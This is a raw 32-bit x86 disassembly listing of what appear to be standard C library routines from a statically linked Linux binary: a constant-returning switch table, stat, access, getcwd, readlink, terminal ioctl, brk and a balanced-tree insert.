mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x14
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x8000
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
leave
jmp fcn.080546b0
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x100
jmp 0x8078ee4
mov eax, 0x63
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x63
jmp 0x8078ee4
mov eax, 0x3e8
jmp 0x8078ee4
mov eax, 0xff
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x7fff
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x100
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 4
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x4000
jmp 0x8078ee4
mov eax, 0x4000
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
leave
jmp fcn.0807a930
leave
jmp fcn.0807a930
leave
jmp fcn.0807ac10
leave
jmp fcn.0807ac20
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x2000
jmp 0x8078ee4
mov eax, 0x1f4
jmp 0x8078ee4
mov eax, 4
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 8
jmp 0x8078ee4
mov eax, 0x7f
jmp 0x8078ee4
mov eax, 0xffffff80
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x80000000
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0x10
jmp 0x8078ee4
mov eax, 0x14
jmp 0x8078ee4
mov eax, 0x7fff
jmp 0x8078ee4
mov eax, 0x7f
jmp 0x8078ee4
mov eax, 0xffffff80
jmp 0x8078ee4
mov eax, 0x7fff
jmp 0x8078ee4
mov eax, 0xffff8000
jmp 0x8078ee4
mov eax, 0xff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffff
jmp 0x8078ee4
mov eax, 0x1000
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x40
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
xor eax, eax
jmp 0x8078ee4
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x5c
mov eax, dword [0x80aad2c]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_ch]
mov esi, dword [arg_10h]
test eax, eax
jne 0x8079684
call fcn.08048b20
mov ecx, esi
mov dword [var_50h], eax
mov edi, dword [eax]
mov eax, 0xc3
int 0x80
cmp eax, 0xfffff000
ja 0x80796c6
cmp eax, 0xffffffff
mov edx, eax
je 0x807966d
test edx, edx
jne 0x8079660
mov eax, dword [esi + 0x58]
cmp dword [esi + 0xc], eax
je 0x8079660
mov eax, dword [esi + 0xc]
mov dword [esi + 0x5c], 0
mov dword [esi + 0x58], eax
lea esi, [esi]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
mov ecx, dword [var_50h]
cmp dword [ecx], 0x26
jne 0x8079643
mov edx, dword [var_50h]
mov dword [edx], edi
mov dword [0x80aad2c], 1
lea edi, [var_4ch]
mov ecx, edi
mov eax, 0x6a
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x80796b6
test ebx, ebx
mov edx, ebx
jne 0x8079660
mov eax, dword [arg_8h]
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], edi
mov dword [esp], eax
call fcn.08054430
mov edx, eax
jmp 0x8079660
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x8079699
mov edx, dword [var_50h]
neg eax
mov dword [edx], eax
mov eax, 0xffffffff
jmp 0x807963c
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov edx, ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_4h]
mov eax, 0x21
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
push ebp
mov ebp, esp
sub esp, 0x24
mov eax, dword [arg_ch]
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [0x80aa9d4]
test eax, eax
je 0x807972f
mov ecx, dword [0x80aa9d8]
test ecx, ecx
je 0x8079914
mov edi, dword [var_10h]
test edi, edi
jne 0x8079743
test esi, esi
mov edi, 0x1000
jne 0x8079904
test esi, esi
mov dword [var_14h], esi
je 0x80798e2
test eax, eax
jne 0x80797ca
mov ebx, dword [var_14h]
mov ecx, edi
mov eax, 0xb7
int 0x80
cmp eax, 0xfffff000
mov dword [var_18h], eax
ja 0x80798c9
mov eax, dword [var_18h]
test eax, eax
js 0x80797a9
test esi, esi
je 0x8079784
mov eax, esi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov ebx, dword [var_10h]
test ebx, ebx
je 0x8079793
test esi, esi
cmove esi, dword [var_14h]
jmp 0x8079777
mov ecx, dword [var_18h]
mov dword [var_sp_4h], ecx
mov ebx, dword [var_14h]
mov dword [esp], ebx
call fcn.08051220
mov esi, eax
jmp 0x807978b
call fcn.08048b20
mov eax, dword [eax]
cmp eax, 0x26
je 0x80798b0
cmp eax, 0x22
jne 0x80798a0
test esi, esi
je 0x80797ca
xor eax, eax
jmp 0x8079779
lea ebx, [edi - 1]
mov dword [var_sp_8h], ebx
mov edx, dword [var_14h]
mov dword [esp], 0x80a3480
mov dword [var_sp_4h], edx
call fcn.08079f10
cmp eax, 0xffffffff
je 0x80797fb
mov ecx, dword [var_14h]
cmp byte [ecx], 0x2f
je 0x8079863
mov dword [0x80aa9d8], 0
call fcn.08048b20
mov edx, dword [eax]
cmp edx, 0xd
je 0x8079818
xor eax, eax
cmp edx, 0x24
cmove eax, dword [0x80aa9d8]
mov dword [0x80aa9d8], eax
mov edx, dword [var_10h]
test edx, edx
je 0x807984f
mov edx, dword [var_10h]
mov eax, dword [var_14h]
call 0x8079930
test eax, eax
mov ebx, eax
je 0x8079837
mov eax, ebx
jmp 0x8079779
test esi, esi
jne 0x8079830
mov eax, dword [var_10h]
test eax, eax
je 0x8079830
mov edx, dword [var_14h]
mov dword [esp], edx
call fcn.08051180
jmp 0x8079830
mov eax, dword [var_14h]
mov dword [esp], eax
call fcn.08051180
mov dword [var_14h], 0
jmp 0x807981f
cmp eax, ebx
jae 0x807988b
mov ebx, dword [var_14h]
test esi, esi
mov byte [eax + ebx], 0
jne 0x8079777
mov ecx, dword [var_10h]
test ecx, ecx
jne 0x807978b
inc eax
mov dword [var_sp_4h], eax
jmp 0x807979d
test esi, esi
jne 0x80797c6
mov dword [esp], ecx
call fcn.08051180
jmp 0x80797c6
test esi, esi
jne 0x80797c6
mov eax, dword [var_14h]
mov dword [esp], eax
jmp 0x8079896
mov dword [0x80aa9d4], 1
mov dword [0x80aa9d8], 1
jmp 0x80797ca
call fcn.08048b20
neg dword [var_18h]
mov edx, dword [var_18h]
mov dword [var_18h], 0xffffffff
mov dword [eax], edx
jmp 0x807976c
mov dword [esp], edi
call fcn.08050fe0
mov dword [var_14h], eax
mov edx, dword [var_14h]
xor eax, eax
test edx, edx
je 0x8079779
mov eax, dword [0x80aa9d4]
jmp 0x807974e
call fcn.08048b20
mov dword [eax], 0x16
jmp 0x80797c6
mov edx, dword [var_10h]
mov eax, esi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
jmp 0x8079930
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc8
mov dword [var_80h], 0xe0
mov dword [var_7ch], str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
mov dword [var_74h], edx
mov dword [var_70h], eax
mov dword [var_78h], str._proc
call fcn.08048b20
mov ecx, dword [var_74h]
mov edx, dword [eax]
test ecx, ecx
mov dword [var_a8h], ecx
mov dword [var_a4h], edx
jne 0x8079986
mov edx, dword [var_70h_2]
mov dword [var_a8h_2], 0x1001
test edx, edx
jne 0x8079ecb
mov esi, dword [var_70h]
test esi, esi
mov dword [var_9ch], esi
je 0x8079ea2
mov edx, dword [var_9ch]
lea ecx, [var_6ch]
add edx, dword [var_a8h]
mov ebx, edx
dec edx
mov dword [var_a0h], edx
mov byte [edx], 0
mov dword [esp], 3
mov dword [esp + 8], ecx
mov dword [esp + 4], 0x80a348f
call fcn.08090000
test eax, eax
js 0x8079d90
mov edx, dword [var_68h]
mov eax, dword [var_6ch]
lea ecx, [var_6ch]
mov dword [var_8ch], edx
mov dword [var_90h], eax
mov edx, dword [var_60h]
mov dword [var_98h], edx
mov dword [esp], 3
mov dword [esp + 4], 0x80a7290
mov dword [esp + 8], ecx
call fcn.08090000
test eax, eax
js 0x8079d90
mov edx, dword [var_68h]
mov eax, dword [var_6ch]
mov dword [var_84h], edx
mov dword [var_88h], eax
mov edx, dword [var_60h]
mov eax, dword [var_90h]
xor eax, dword [var_88h]
mov dword [var_94h], edx
mov edx, dword [var_8ch]
xor edx, dword [var_84h]
or edx, eax
je 0x8079e8b
mov esi, dword [var_7ch]
cmp dword [var_78h], esi
je 0x8079e05
sub dword [var_78h], 3
lea esi, [var_6ch]
mov dword [esp + 8], esi
mov eax, dword [var_78h]
mov dword [esp], 3
mov dword [esp + 4], eax
call fcn.08090000
test eax, eax
js 0x8079d7c
mov edx, dword [var_6ch]
mov ecx, dword [var_68h]
mov esi, dword [var_78h]
mov dword [var_b4h], edx
mov dword [var_b0h], ecx
mov eax, dword [var_b4h]
mov edx, dword [var_b0h]
xor eax, dword [var_90h]
xor edx, dword [var_8ch]
mov ecx, dword [var_60h]
mov dword [var_b8h], ecx
or eax, edx
setne byte [var_b9h]
mov dword [esp], esi
call fcn.0808f9c0
test eax, eax
mov dword [var_ach], eax
je 0x8079d7c
call fcn.08048b20
mov edi, dword [var_7ch]
add edi, dword [var_80h]
mov dword [eax], 0
sub edi, esi
mov edx, dword [var_ach]
mov dword [esp], edx
call fcn.0808fc00
test eax, eax
mov esi, eax
je 0x8079dc6
cmp byte [esi + 0xb], 0x2e
je 0x8079deb
cmp byte [var_b9h], 0
jne 0x8079b1a
mov eax, dword [var_98h_2]
cmp dword [esi], eax
jne 0x8079ae5
movzx eax, word [esi + 8]
mov dword [var_c0h], esp
lea eax, [eax + edi + 8]
and eax, 0xfffffffc
sub esp, eax
mov dword [esp + 8], edi
lea ebx, [var_b9h]
mov edx, dword [var_78h_2]
and ebx, 0xfffffff0
mov dword [esp], ebx
mov dword [esp + 4], edx
call fcn.08053740
lea edx, [esi + 0xb]
mov byte [eax], 0x2f
mov dword [esp + 4], edx
inc eax
mov dword [esp], eax
call fcn.0808dc90
mov dword [esp], 3
mov dword [esp + 4], ebx
lea ecx, [var_6ch_2]
mov dword [esp + 8], ecx
call fcn.08090000
test eax, eax
js 0x8079b98
mov eax, dword [var_6ch_2]
mov edx, dword [var_68h_2]
mov ecx, dword [var_8ch_2]
xor eax, dword [var_90h_2]
xor ecx, edx
or ecx, eax
jne 0x8079b98
mov eax, dword [var_98h_2]
cmp dword [var_60h_2], eax
je 0x8079ba3
mov esp, dword [var_c0h_2]
jmp 0x8079ae5
test esi, esi
mov esp, dword [var_c0h_2]
je 0x8079dc6
add esi, 0xb
mov dword [var_c4h], esi
mov dword [esp], esi
call fcn.08053400
mov esi, dword [var_a0h_2]
sub esi, dword [var_9ch_2]
mov edi, eax
cmp esi, eax
mov dword [var_c8h], esi
ja 0x8079c54
mov esi, dword [var_74h_2]
test esi, esi
jne 0x8079dab
mov esi, dword [var_a8h_2]
cmp eax, esi
mov eax, esi
cmovae eax, edi
add eax, eax
mov dword [var_a8h_2], eax
mov dword [esp + 4], eax
mov eax, dword [var_9ch_2]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x8079d63
mov eax, dword [var_9ch_2]
mov ecx, dword [var_a8h_2]
add eax, esi
lea edx, [ecx + ebx]
mov esi, dword [var_c8h]
sub eax, dword [var_a0h_2]
lea ecx, [esi + ebx]
mov dword [esp + 4], ecx
sub edx, eax
mov dword [esp + 8], eax
mov dword [esp], edx
call fcn.08053770
mov dword [var_9ch_2], ebx
mov dword [var_a0h_2], eax
sub dword [var_a0h_2], edi
mov dword [esp + 8], edi
mov eax, dword [var_c4h]
mov dword [esp + 4], eax
mov edx, dword [var_a0h_2]
mov dword [esp], edx
call fcn.08053770
dec dword [var_a0h_2]
mov ecx, dword [var_a0h_2]
mov byte [ecx], 0x2f
mov esi, dword [var_ach_2]
mov dword [esp], esi
call fcn.0808fb60
mov edx, dword [var_b0h_2]
mov eax, dword [var_b4h_2]
mov dword [var_8ch_2], edx
mov dword [var_90h_2], eax
mov edx, dword [var_b8h_2]
mov eax, dword [var_90h_2]
xor eax, dword [var_88h_2]
mov dword [var_98h_2], edx
mov edx, dword [var_8ch_2]
xor edx, dword [var_84h_2]
or edx, eax
jne 0x8079a4b
mov ecx, dword [var_94h_2]
cmp dword [var_b8h_2], ecx
jne 0x8079a4b
mov esi, dword [var_9ch_2]
mov eax, dword [var_a8h_2]
lea ebx, [eax + esi]
lea eax, [ebx - 1]
cmp dword [var_a0h_2], eax
je 0x8079d54
cmp dword [var_7ch_2], str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
je 0x8079d17
mov ecx, dword [var_7ch_2]
mov dword [esp], ecx
call fcn.08051180
sub ebx, dword [var_a0h_2]
mov dword [esp + 8], ebx
mov esi, dword [var_a0h_2]
mov dword [esp + 4], esi
mov eax, dword [var_9ch_2]
mov dword [esp], eax
call fcn.08053690
call fcn.08048b20
mov edx, dword [var_a4h_2]
mov dword [eax], edx
mov eax, dword [var_9ch_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
lea edx, [ebx - 2]
mov dword [var_a0h_2], edx
mov byte [ebx - 2], 0x2f
jmp 0x8079d03
mov ecx, dword [var_ach_2]
mov dword [esp], ecx
call fcn.0808fb60
call fcn.08048b20
mov dword [eax], 0xc
cmp dword [var_7ch], str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
je 0x8079d90
mov eax, dword [var_7ch]
mov dword [esp], eax
call fcn.08051180
mov ebx, dword [var_70h]
test ebx, ebx
je 0x8079d9b
xor eax, eax
jmp 0x8079d4c
mov edx, dword [var_9ch]
mov dword [esp], edx
call fcn.08051180
jmp 0x8079d97
mov esi, dword [var_ach_2]
mov dword [esp], esi
call fcn.0808fb60
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x8079d7c
call fcn.08048b20
mov ecx, dword [var_ach]
mov ebx, dword [eax]
mov esi, eax
mov dword [esp], ecx
call fcn.0808fb60
mov eax, 2
test ebx, ebx
cmove ebx, eax
mov dword [esi], ebx
jmp 0x8079d7c
cmp byte [esi + 0xc], 0
je 0x8079ae5
cmp word [esi + 0xc], 0x2e
jne 0x8079b07
jmp 0x8079ae5
cmp esi, str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
je 0x8079e56
mov esi, dword [var_80h_2]
lea eax, [esi + esi + 1]
mov dword [esp + 4], eax
mov eax, dword [var_7ch_2]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x8079d7c
add esi, eax
mov dword [var_78h_2], esi
mov edx, dword [var_80h]
mov dword [esp + 4], ebx
mov dword [esp + 8], edx
mov ecx, dword [var_78h]
mov dword [esp], ecx
call fcn.08053740
mov byte [eax], 0
mov dword [var_7ch], ebx
shl dword [var_80h], 1
jmp 0x8079a57
mov edx, dword [var_80h]
lea eax, [edx + edx + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8079d7c
mov ecx, dword [var_80h]
mov dword [esp], eax
mov dword [esp + 4], 0x80a34a0
mov dword [esp + 8], ecx
call fcn.08053740
mov dword [var_78h], eax
jmp 0x8079e32
mov ecx, dword [var_94h]
cmp dword [var_98h], ecx
jne 0x8079a4b
jmp 0x8079cf8
mov eax, dword [var_a8h]
mov dword [esp], eax
call fcn.08050fe0
mov dword [var_9ch], eax
mov edi, dword [var_9ch]
xor eax, eax
test edi, edi
jne 0x8079997
jmp 0x8079d4c
mov dword [eax], 0x16
jmp 0x8079d97
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x48
lea eax, [var_40h]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08079f40
test eax, eax
sete al
leave
movzx eax, al
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x55
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ecx, 0x5401
mov ebp, esp
push edi
push ebx
lea edx, [var_38h]
sub esp, 0x3c
mov edi, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x36
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x8079fc2
mov eax, dword [var_38h]
mov dword [edi], eax
mov eax, dword [var_34h]
mov dword [edi + 4], eax
mov edx, dword [var_30h]
mov dword [edi + 8], edx
and edx, 0x100f
mov eax, dword [var_2ch]
mov dword [edi + 0xc], eax
movzx eax, byte [var_28h]
mov dword [edi + 0x38], edx
mov dword [edi + 0x34], edx
mov byte [edi + 0x10], al
lea eax, [var_27h]
mov dword [var_8h], 0x13
mov dword [var_4h], eax
lea eax, [edi + 0x11]
mov dword [esp], eax
call fcn.08053740
mov ecx, 3
mov edi, eax
xor eax, eax
cld
rep stosd dword es:[edi], eax
mov byte [edi], 0
mov eax, ebx
add esp, 0x3c
pop ebx
pop edi
leave
ret
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x8079f66
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov eax, 0x2d
int 0x80
xor edx, edx
cmp eax, ebx
mov dword [0x80aa9dc], eax
jb 0x807a000
mov ebx, dword [esp]
mov eax, edx
leave
ret
call fcn.08048b20
mov edx, 0xffffffff
mov dword [eax], 0xc
jmp 0x8079ff9
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [var_8h]
mov dword [esp], 7
mov dword [var_4h], eax
call fcn.08090180
mov edx, eax
mov eax, 0x100
test edx, edx
cmovns eax, dword [var_8h]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xc
cmp dword [arg_1ch], 1
mov eax, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_4h], esi
mov dword [var_8h], edi
mov ebx, dword [arg_ch]
mov ecx, dword [eax]
je 0x807a180
mov eax, dword [ecx + 8]
test eax, eax
je 0x807a132
mov edx, dword [ecx + 4]
test edx, edx
je 0x807a132
test byte [eax + 0xc], 1
je 0x807a132
test byte [edx + 0xc], 1
je 0x807a132
or byte [ecx + 0xc], 1
test eax, eax
je 0x807a0d1
and byte [eax + 0xc], 0xfe
mov eax, dword [ecx + 4]
test eax, eax
je 0x807a0dc
and byte [eax + 0xc], 0xfe
test ebx, ebx
je 0x807a132
mov esi, dword [ebx]
movzx ebx, byte [esi + 0xc]
test bl, 1
je 0x807a132
mov eax, dword [arg_10h]
mov edi, dword [eax]
mov eax, dword [arg_14h]
test eax, eax
mov eax, dword [arg_18h]
setg dl
test eax, eax
setg al
xor eax, edx
test al, 1
je 0x807a153
or ebx, 1
mov byte [esi + 0xc], bl
or byte [edi + 0xc], 1
and byte [ecx + 0xc], 0xfe
mov edx, dword [arg_14h]
test edx, edx
js 0x807a13f
mov eax, dword [ecx + 4]
mov dword [esi + 8], eax
mov eax, dword [ecx + 8]
mov dword [ecx + 4], esi
mov dword [edi + 4], eax
mov dword [ecx + 8], edi
mov eax, dword [arg_10h]
mov dword [eax], ecx
mov ebx, dword [esp]
mov esi, dword [var_4h]
mov edi, dword [var_8h]
leave
ret
mov eax, dword [ecx + 8]
mov dword [esi + 4], eax
mov eax, dword [ecx + 4]
mov dword [ecx + 8], esi
mov dword [edi + 8], eax
mov dword [ecx + 4], edi
jmp 0x807a12d
mov eax, dword [arg_10h]
mov dword [eax], esi
and byte [esi + 0xc], 0xfe
or byte [edi + 0xc], 1
mov eax, dword [arg_14h]
test eax, eax
js 0x807a172
mov eax, dword [esi + 4]
mov dword [esi + 4], edi
mov dword [edi + 8], eax
jmp 0x807a132
mov eax, dword [esi + 8]
mov dword [esi + 8], edi
mov dword [edi + 4], eax
jmp 0x807a132
lea esi, [esi]
mov eax, dword [ecx + 8]
jmp 0x807a0c5
nop
lea esi, [esi]
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov dword [var_20h], 0
mov dword [var_1ch], 0
mov edi, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_14h], 0
mov dword [var_18h], 0
test edi, edi
je 0x807a2b4
mov eax, dword [edi]
test eax, eax
je 0x807a1d5
and byte [eax + 0xc], 0xfe
mov eax, dword [edi]
test eax, eax
mov esi, edi
je 0x807a25a
nop
lea esi, [esi]
mov ebx, dword [edi]
mov eax, dword [ebx]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [arg_10h]
mov dword [var_18h], eax
mov ecx, dword [var_18h]
mov eax, ebx
test ecx, ecx
je 0x807a2b4
mov eax, dword [var_20h]
mov dword [var_sp_14h], 0
mov dword [esp], edi
lea esi, [ebx + 4]
mov dword [var_sp_10h], eax
mov eax, dword [var_1ch]
mov dword [var_ch], eax
mov eax, dword [var_14h]
mov dword [var_8h], eax
mov eax, dword [var_10h]
mov dword [var_4h], eax
call fcn.0807a080
mov edx, dword [var_18h]
lea eax, [ebx + 8]
test edx, edx
cmovns esi, eax
mov eax, dword [esi]
test eax, eax
je 0x807a25a
mov eax, dword [var_10h]
mov dword [var_10h], edi
mov edi, esi
mov dword [var_14h], eax
mov eax, dword [var_1ch]
mov dword [var_20h], eax
mov eax, dword [var_18h]
mov dword [var_1ch], eax
jmp 0x807a1e0
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807a285
mov dword [esi], eax
mov dword [ebx + 4], 0
mov dword [ebx + 8], 0
mov eax, dword [arg_8h]
or byte [ebx + 0xc], 1
mov dword [ebx], eax
cmp esi, edi
je 0x807a2b2
mov eax, dword [var_1ch]
mov dword [var_sp_14h], 1
mov dword [var_4h], edi
mov dword [esp], esi
mov dword [var_sp_10h], eax
mov eax, dword [var_18h]
mov dword [var_ch], eax
mov eax, dword [var_10h]
mov dword [var_8h], eax
call fcn.0807a080
mov eax, ebx
